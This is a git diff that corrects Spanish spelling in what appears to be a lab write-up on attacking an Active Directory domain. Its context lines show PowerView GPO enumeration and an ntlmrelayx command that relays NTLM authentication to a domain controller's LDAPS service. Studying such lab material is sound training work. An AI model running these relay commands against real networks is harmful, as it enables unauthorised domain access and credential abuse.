@@ -21,7 +21,7 @@ Y después podremos ejecutar *PowerView*
 Get-DomainGPO -ComputerIdentity DCORP-CI
 ```
 
-Viendo que pertenece a la política *DevOps*, para confirmar la existencia de esta politica
+Viendo que pertenece a la política *DevOps*, para confirmar la existencia de esta política
 ```shell
 Get-DomainGPO -Identity 'DevOps Policy'
 ```
@@ -31,7 +31,7 @@ A continuación necesitaremos ejecutar *ntlmrelayx* usando *WSL* para poder retr
 sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
 ```
 
-PAra obtener la IP del controlador del dominio deberemos de hacer ping a este
+Para obtener la IP del controlador del dominio deberemos de hacer ping a este
 ```shell
 ping DOLLARCORP.MONEYCORP.LOCAL
 ```
